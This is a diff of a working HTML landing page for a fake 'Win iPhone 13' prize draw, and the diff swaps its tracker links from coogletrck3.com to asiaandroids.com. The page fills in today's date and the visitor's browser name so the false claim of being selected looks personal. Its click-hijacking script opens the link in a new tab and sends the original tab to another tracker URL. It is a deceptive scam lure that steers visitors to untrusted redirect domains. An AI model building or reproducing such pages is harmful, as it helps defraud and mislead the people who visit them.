@@ -9,82 +9,82 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
 </head>
 <script>
-function getURLParameter(name) {
-    name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
-    var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
-        results = regex.exec(location.search);
-    return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
-}
-function dateOffset(f, c) {
-    var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
-        h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
-    1 == b && (f = 0);
-    var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
-        g = ["January", "February", "March", "April", "Maybe", "June", "July", "August", "September", "October", "November", "December"];
-    return null != !c && 0 != !c && void 0 != !c
-        ? h.getDate() + " " + g[h.getMonth()]
-        : "day_name_only" == c && b
-        ? d[h.getDay()]
-        : "top_date" == c && b
-        ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear()
-        : void 0;
-}
+    function getURLParameter(name) {
+        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+        var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+            results = regex.exec(location.search);
+        return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+    function dateOffset(f, c) {
+        var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f),
+            h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+        1 == b && (f = 0);
+        var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
+            g = ["January", "February", "March", "April", "Maybe", "June", "July", "August", "September", "October", "November", "December"];
+        return null != !c && 0 != !c && void 0 != !c
+            ? h.getDate() + " " + g[h.getMonth()]
+            : "day_name_only" == c && b
+            ? d[h.getDay()]
+            : "top_date" == c && b
+            ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear()
+            : void 0;
+    }
 </script>
 <body>
-<div class="wrapper">
-    <div class="header__logo">
-
-    <div class="logo">
-        <img src="img/logo.png" alt="" />
-        <span>Gift time</span>
+    <div class="wrapper">
+        <div class="header__logo">
+    
+        <div class="logo">
+            <img src="img/logo.png" alt="" />
+            <span>Gift time</span>
+        </div>
+        <div class="time"></div>
     </div>
-    <div class="time"></div>
-</div>
-    <div class="intro">
-        Every
-        <span id="today">
+        <div class="intro">
+            Every
+            <span id="today">
+                <script>
+                    document.write(dateOffset(0, "day_name_only"));
+                </script>
+            </span>
+            we select 5
             <script>
-                document.write(dateOffset(0, "day_name_only"));
+                document.write(getURLParameter("browser"));
             </script>
-        </span>
-        we select 5
-        <script>
-            document.write(getURLParameter("browser"));
-        </script>
-        Chrome Mobile Browser users to give them the opportunity to win prizes from our sponsors.
-    </div>
-    <div class="header__text">
-        You are selected as drawing player
-    </div>
-
-    <div class="main">
-        <div class="main__img">
-            <img src="img/main.png" alt="" />
+            users to give them the opportunity to win prizes from our sponsors.
+        </div>
+        <div class="header__text">
+            You are selected as drawing player
         </div>
 
-        <div class="main__title">Win <span>iPhone 13</span></div>
-        <div class="main__text">
-            Click "Next!" to play!
+        <div class="main">
+            <div class="main__img">
+                <img src="img/main.png" alt="" />
+            </div>
+
+            <div class="main__title">Win <span>iPhone 13</span></div>
+            <div class="main__text">
+                Click "Next!" to play!
+            </div>
+        </div>
+        <div class="main__btn">
+            <a href="https://asiaandroids.com/cajjl4k.php?lp=1" class="main__button mainButton">Next!</a>
         </div>
     </div>
-    <div class="main__btn">
-        <a href="https://coogletrck3.com/click.php?lp=1" class="mainButton main__button">Next!</a>
-    </div>
-</div>
-<script>
-    const now = new Date();
-    const year = now.getFullYear();
-    const month = now.getMonth();
-    const day = now.getDate();
-    let all = `${day}/${month + 1}/${year}`;
-    const time = document.querySelector(".time");
-    time.innerText = `${day}/${month + 1}/${year}`;
-    const browser = document.querySelector(".browser");
-</script>
+    <script>
+        const now = new Date();
+        const year = now.getFullYear();
+        const month = now.getMonth();
+        const day = now.getDate();
+        let all = `${day}/${month + 1}/${year}`;
+        const time = document.querySelector(".time");
+        time.innerText = `${day}/${month + 1}/${year}`;
+        const browser = document.querySelector(".browser");
+    </script>
 <script>
 var cta = 'mainButton';
-var back = 'https://coogletrck3.com/chh9l3k.php?key=0lp9k1kle3m19wqtwn9o';
-var under = 'https://coogletrck3.com/chh9l3k.php?key=1ljqrx4lpjqw93hr8i6m';
+var back = 'https://asiaandroids.com/cajjl4k.php?key=o7kz4w5w3dga3uqnhx1p';
+var under = 'https://asiaandroids.com/cajjl4k.php?key=afvoh1gzmxuri5mnkt7t';
 if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
 target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
 target=target.parentNode;}});}}
